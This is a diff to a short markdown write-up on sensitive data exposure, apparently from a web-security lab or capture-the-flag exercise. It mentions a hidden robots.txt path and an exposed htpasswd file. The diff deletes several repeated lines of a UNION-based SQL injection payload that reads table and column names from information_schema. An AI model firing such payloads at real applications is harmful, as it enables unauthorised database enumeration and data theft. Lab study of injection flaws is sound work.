@@ -1,6 +1,6 @@
 # Sensitive_data_exposure
 
-## Sensitive_data_exposure_explain
+## Description
 
 Generally, our sensitive information includes passwords, financial data, medical data, etc. Due to the unencrypted or incorrect protection of sensitive data in web applications or APIs, these data are easily exploited by attackers, and attackers may use these data to commit crimes. Behavior.
 
@@ -21,18 +21,7 @@ Generally, our sensitive information includes passwords, financial data, medical
     Disallow: /.hidden
 
 ## /whaterver
-ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
-Title: list_images
-Url : id
-ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
-Title: list_images
-Url : url
-ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
-Title: list_images
-Url : title
-ID: 1 or 1=1 union select column_name, table_name from information_schema.columns where table_schema=database(); 
-Title: list_images
-Url : comment
+
     A index page content a "htpasswd" file.
 
 
